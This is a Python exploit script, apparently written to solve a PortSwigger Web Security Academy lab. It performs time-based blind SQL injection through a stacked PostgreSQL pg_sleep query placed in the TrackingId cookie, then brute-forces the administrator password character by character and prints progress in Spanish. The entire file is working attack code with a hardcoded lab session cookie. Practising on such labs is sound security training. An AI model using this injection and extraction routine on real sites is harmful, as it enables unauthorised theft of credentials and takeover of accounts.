#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import signal
import sys
import string
import time

characters = string.ascii_letters + string.digits
p1 = log.progress("SQLI")

def def_handler(sig, frame):
    print(colored("\n\n[! Saliendo...]\n", "red"))
    p1.failure("Ataque detenido por el usuario")
    sys.exit(1)

# CTRL + C

signal.signal(signal.SIGINT, def_handler)

def makeSQLI():
    password = ""
    p1.status("Probando inyección con condición 1=1")
    cookies_test = {
        'TrackingId': "test'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- ",
        'session': "vRuEszm8zf8NLXJTRJkJ15KS3SSacPC1"
    }
    time_start = time.time()
    try:
        r = requests.get("https://0a67000c041cabb380a2264c00b400fa.web-security-academy.net/", cookies=cookies_test)
        time_end = time.time()
        if time_end - time_start > 10:
            print(colored("[+] Inyección funciona: delay detectado", "green"))
        else:
            print(colored("[!] Inyección no funciona: no hay delay", "red"))
    except requests.RequestException as e:
        print(colored(f"[!] Error en prueba de inyección: {e}", "red"))

    p1.status("iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress('password')

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"test'%3B SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{character}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- ",
                'session': "vRuEszm8zf8NLXJTRJkJ15KS3SSacPC1"
            }
            p1.status(f"Probando posición {position}, carácter '{character}'")

            time_start = time.time()

            try:
                r = requests.get("https://0a67000c041cabb380a2264c00b400fa.web-security-academy.net/", cookies=cookies)
            except requests.RequestException as e:
                print(colored(f"[!] Error en la petición: {e}", "red"))
                continue

            time_end = time.time()

            if time_end - time_start > 10:
                password += character
                p2.status(password)
                print(colored(f"[+] Carácter encontrado en posición {position}: '{character}' - Contraseña actual: {password}", "yellow"))
                break

    print(colored(f"\n[+] Contraseña encontrada: {password}", "green"))

if __name__ == '__main__':

    makeSQLI()
